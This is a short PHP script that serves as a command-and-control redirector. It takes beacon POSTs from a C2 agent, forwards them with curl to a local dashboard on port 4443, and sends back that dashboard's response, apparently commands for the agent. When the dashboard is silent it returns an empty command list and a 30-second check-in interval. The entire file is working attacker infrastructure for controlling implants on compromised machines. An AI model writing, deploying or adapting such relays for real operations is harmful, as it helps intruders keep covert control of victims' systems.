<?php
// Beacon proxy - receives C2 agent POST, forwards to dashboard:4443
$post_data = http_build_query($_POST);
$url = escapeshellarg('http://127.0.0.1:4443/beacon');
$data = escapeshellarg($post_data);
$result = shell_exec("curl -s --connect-timeout 3 -X POST {$url} -d {$data} 2>/dev/null");
if ($result) {
    header('Content-Type: application/json');
    echo $result;
} else {
    header('Content-Type: application/json');
    echo '{"commands":[],"interval":30}';
}
